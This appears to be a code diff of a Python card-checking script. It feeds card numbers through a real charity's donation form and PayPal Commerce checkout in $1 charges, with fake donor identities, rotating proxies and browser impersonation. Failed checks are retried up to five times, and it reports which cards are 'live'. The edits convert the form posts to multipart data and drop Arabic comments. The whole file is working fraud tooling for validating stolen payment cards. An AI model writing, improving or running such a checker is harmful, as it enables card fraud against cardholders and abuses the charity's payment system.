@@ -1,6 +1,6 @@
+import asyncio
 import re
 import json
-import asyncio
 import base64
 import secrets
 import uuid
@@ -27,7 +27,6 @@ class tools:
             yy = yy
             
         return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
-
 
     @staticmethod
     def find_between(s: str, first: str, last: str) -> str | None:
@@ -93,7 +92,6 @@ RESPONSE_MAP = {
 class Gateway:
     @staticmethod
     async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
-        ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
         token = secrets.token_hex(16)
 
         async with AsyncSession(impersonate="chrome", proxies=proxies) as session:
@@ -123,7 +121,7 @@ class Gateway:
                     return "Error", "accessToken not found", False
                 au = au_match.group(1)
 
-                # Step 2: First AJAX - give_process_donation
+                # Step 2: First AJAX - give_process_donation (urlencoded)
                 headers_ajax1 = {
                     "origin": "https://bukjeh.org",
                     "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
@@ -137,7 +135,7 @@ class Gateway:
                     "give-honeypot": "",
                     "give-form-id-prefix": pre,
                     "give-form-id": give,
-                    "give-form-title": "Help us make A'amar",
+                    "give-form-title": "Help us make A’amar",
                     "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                     "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                     "give-form-minimum": "1.00",
@@ -168,50 +166,49 @@ class Gateway:
                     data=data_ajax1,
                 )
 
-                # Step 3: Second AJAX - create order
+                # Step 3: Second AJAX - create order (multipart/form-data via files)
                 headers_ajax2 = {
                     "origin": "https://bukjeh.org",
                     "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                 }
                 params_ajax2 = {
                     "action": "give_paypal_commerce_create_order",
                 }
-                data_ajax2 = {
-                    "give-fee-amount": "0",
-                    "give-fee-mode-enable": "false",
-                    "give-fee-status": "enabled",
-                    "give-honeypot": "",
-                    "give-form-id-prefix": pre,
-                    "give-form-id": give,
-                    "give-form-title": "Help us make A'amar",
-                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
-                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
-                    "give-form-minimum": "1.00",
-                    "give-form-maximum": "999999.99",
-                    "give-form-hash": hash_val,
-                    "give-price-id": "3",
-                    "give-recurring-logged-in-only": "",
-                    "give-logged-in-only": "1",
-                    "_give_is_donation_recurring": "0",
-                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
-                    "give-amount": "1.00",
-                    "give-recurring-period-donors-choice": "month",
-                    "give_stripe_payment_method": "",
-                    "payment-mode": "paypal-commerce",
-                    "give_first": user_data["first"],
-                    "give_last": user_data["last"],
-                    "give_email": user_data["email"],
-                    "card_name": user_data["name"],
-                    "card_exp_month": "",
-                    "card_exp_year": "",
-                    "give-gateway": "paypal-commerce",
+                files_ajax2 = {
+                    "give-fee-amount": (None, "0"),
+                    "give-fee-mode-enable": (None, "false"),
+                    "give-fee-status": (None, "enabled"),
+                    "give-honeypot": (None, ""),
+                    "give-form-id-prefix": (None, pre),
+                    "give-form-id": (None, give),
+                    "give-form-title": (None, "Help us make A’amar"),
+                    "give-current-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
+                    "give-form-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
+                    "give-form-minimum": (None, "1.00"),
+                    "give-form-maximum": (None, "999999.99"),
+                    "give-form-hash": (None, hash_val),
+                    "give-price-id": (None, "3"),
+                    "give-recurring-logged-in-only": (None, ""),
+                    "give-logged-in-only": (None, "1"),
+                    "_give_is_donation_recurring": (None, "0"),
+                    "give_recurring_donation_details": (None, '{"give_recurring_option":"yes_donor"}'),
+                    "give-amount": (None, "1.00"),
+                    "give-recurring-period-donors-choice": (None, "month"),
+                    "give_stripe_payment_method": (None, ""),
+                    "payment-mode": (None, "paypal-commerce"),
+                    "give_first": (None, user_data["first"]),
+                    "give_last": (None, user_data["last"]),
+                    "give_email": (None, user_data["email"]),
+                    "card_name": (None, user_data["name"]),
+                    "card_exp_month": (None, ""),
+                    "card_exp_year": (None, ""),
+                    "give-gateway": (None, "paypal-commerce"),
                 }
                 resp_ajax2 = await session.post(
                     "https://bukjeh.org/wp-admin/admin-ajax.php",
                     params=params_ajax2,
                     headers=headers_ajax2,
-                    data=data_ajax2,
+                    files=files_ajax2,
                 )
                 ajax2_json = resp_ajax2.json()
                 order_id = ajax2_json.get("data", {}).get("id")
@@ -250,51 +247,50 @@ class Gateway:
                 )
                 paypal_text = resp_paypal.text.lower()
 
-                # Step 5: Third AJAX - approve order
+                # Step 5: Third AJAX - approve order (multipart/form-data via files)
                 headers_ajax3 = {
                     "origin": "https://bukjeh.org",
                     "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                 }
                 params_ajax3 = {
                     "action": "give_paypal_commerce_approve_order",
                     "order": order_id,
                 }
-                data_ajax3 = {
-                    "give-fee-amount": "0",
-                    "give-fee-mode-enable": "false",
-                    "give-fee-status": "enabled",
-                    "give-honeypot": "",
-                    "give-form-id-prefix": pre,
-                    "give-form-id": give,
-                    "give-form-title": "Help us make A'amar",
-                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
-                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
-                    "give-form-minimum": "1.00",
-                    "give-form-maximum": "999999.99",
-                    "give-form-hash": hash_val,
-                    "give-price-id": "3",
-                    "give-recurring-logged-in-only": "",
-                    "give-logged-in-only": "1",
-                    "_give_is_donation_recurring": "0",
-                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
-                    "give-amount": "1.00",
-                    "give-recurring-period-donors-choice": "month",
-                    "give_stripe_payment_method": "",
-                    "payment-mode": "paypal-commerce",
-                    "give_first": user_data["first"],
-                    "give_last": user_data["last"],
-                    "give_email": user_data["email"],
-                    "card_name": user_data["name"],
-                    "card_exp_month": "",
-                    "card_exp_year": "",
-                    "give-gateway": "paypal-commerce",
+                files_ajax3 = {
+                    "give-fee-amount": (None, "0"),
+                    "give-fee-mode-enable": (None, "false"),
+                    "give-fee-status": (None, "enabled"),
+                    "give-honeypot": (None, ""),
+                    "give-form-id-prefix": (None, pre),
+                    "give-form-id": (None, give),
+                    "give-form-title": (None, "Help us make A’amar"),
+                    "give-current-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
+                    "give-form-url": (None, "https://bukjeh.org/donations/donation-2023-2-3/"),
+                    "give-form-minimum": (None, "1.00"),
+                    "give-form-maximum": (None, "999999.99"),
+                    "give-form-hash": (None, hash_val),
+                    "give-price-id": (None, "3"),
+                    "give-recurring-logged-in-only": (None, ""),
+                    "give-logged-in-only": (None, "1"),
+                    "_give_is_donation_recurring": (None, "0"),
+                    "give_recurring_donation_details": (None, '{"give_recurring_option":"yes_donor"}'),
+                    "give-amount": (None, "1.00"),
+                    "give-recurring-period-donors-choice": (None, "month"),
+                    "give_stripe_payment_method": (None, ""),
+                    "payment-mode": (None, "paypal-commerce"),
+                    "give_first": (None, user_data["first"]),
+                    "give_last": (None, user_data["last"]),
+                    "give_email": (None, user_data["email"]),
+                    "card_name": (None, user_data["name"]),
+                    "card_exp_month": (None, ""),
+                    "card_exp_year": (None, ""),
+                    "give-gateway": (None, "paypal-commerce"),
                 }
                 resp_ajax3 = await session.post(
                     "https://bukjeh.org/wp-admin/admin-ajax.php",
                     params=params_ajax3,
                     headers=headers_ajax3,
-                    data=data_ajax3,
+                    files=files_ajax3,
                 )
                 approve_text = resp_ajax3.text.lower()
 
@@ -321,48 +317,30 @@ class Gateway:
 
 
 async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
-    """
-    معالجة الدفع مع نظام إعادة محاولة (Retry) عند الحصول على "Order Not Approved".
-    - الحد الأقصى للمحاولات: 5.
-    - كل محاولة تستخدم بيانات مستخدم جديدة وبروكسي جديد (يتم جلبه من get_next_proxy).
-    - أي رد آخر غير "Order Not Approved" ينهي المحاولات فوراً ويعيد النتيجة.
-    - إذا استمرت جميع المحاولات الخمس بـ "Order Not Approved"، يتم إرجاع النتيجة النهائية.
-    """
     card_data = tools.getcard(card_line)
     if not card_data["cc"]:
         return "Failed", "Invalid card format", False
 
     max_attempts = 5
-    last_result = None
 
     for attempt in range(max_attempts):
-        # 1. بيانات مستخدم جديدة
         user_data = tools.userdata()
-
-        # 2. بروكسي جديد من proxy_manager
-        proxy_url_new = get_next_proxy()  # قد ترجع None
+        proxy_url_new = get_next_proxy()
         proxies = {"http": proxy_url_new, "https": proxy_url_new} if proxy_url_new else None
 
-        # 3. تنفيذ عملية الدفع
         status, msg, is_live = await Gateway.charge_card(
             card_data=card_data,
             user_data=user_data,
             proxies=proxies,
         )
 
-        # 4. التحقق من النتيجة
         if "Order Not Approved" in msg:
-            # هذه الحالة فشل، نستمر في المحاولات ما لم تكن الأخيرة
             if attempt == max_attempts - 1:
-                # المحاولة الأخيرة أيضاً فشلت، نعيد هذه النتيجة
                 return status, msg, is_live
-            # خلاف ذلك، نواصل الحلقة
             continue
         else:
-            # أي رد آخر (نجاح أو فشل مختلف) نعتبره نهائياً ونوقفه
             return status, msg, is_live
 
-    # في حال خرجت الحلقة دون return (لن يحدث) نعيد افتراضي
     return "Error", "Max attempts exceeded unexpectedly", False
     
 async def main():
